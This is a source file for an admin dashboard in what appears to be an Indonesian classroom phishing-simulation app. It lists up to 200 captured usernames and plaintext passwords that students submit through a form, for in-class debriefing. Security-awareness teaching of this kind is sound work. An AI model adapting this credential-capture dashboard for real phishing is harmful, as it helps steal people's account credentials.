import { logoutAdmin } from "@/app/actions/admin";
import { prisma } from "@/lib/prisma";

export const dynamic = "force-dynamic";

export default async function AdminDashboardPage() {
  const rows = await prisma.credentialSubmission.findMany({
    orderBy: { createdAt: "desc" },
    take: 200,
  });

  return (
    <div className="min-h-screen bg-zinc-50 text-zinc-900">
      <header className="border-b border-zinc-200 bg-white px-4 py-4">
        <div className="mx-auto flex max-w-5xl items-center justify-between gap-4">
          <div>
            <h1 className="text-lg font-semibold">Kiriman simulasi</h1>
            <p className="text-xs text-zinc-500">
              Maksimal 200 entri terbaru — untuk proyeksi atau debrief di kelas.
            </p>
          </div>
          <form action={logoutAdmin}>
            <button
              type="submit"
              className="rounded-lg border border-zinc-300 bg-white px-3 py-2 text-sm font-medium hover:bg-zinc-100"
            >
              Keluar
            </button>
          </form>
        </div>
      </header>

      <div className="mx-auto max-w-5xl overflow-auto px-4 py-8">
        <table className="w-full border-collapse rounded-lg bg-white text-left text-sm shadow-sm">
          <thead>
            <tr className="border-b border-zinc-200 bg-zinc-100">
              <th className="p-3 font-medium">Username</th>
              <th className="p-3 font-medium">Password (demo)</th>
              <th className="p-3 font-medium">Waktu (server)</th>
            </tr>
          </thead>
          <tbody>
            {rows.length === 0 ? (
              <tr>
                <td className="p-4 text-zinc-500" colSpan={3}>
                  Belum ada data — minta siswa akses halaman utama lalu kirim form.
                </td>
              </tr>
            ) : (
              rows.map((r) => (
                <tr key={r.id} className="border-b border-zinc-100">
                  <td className="max-w-[200px] break-all p-3 font-mono text-xs">
                    {r.username}
                  </td>
                  <td className="max-w-[200px] break-all p-3 font-mono text-xs">
                    {r.password}
                  </td>
                  <td className="whitespace-nowrap p-3 text-xs text-zinc-600">
                    {r.createdAt.toISOString()}
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
}
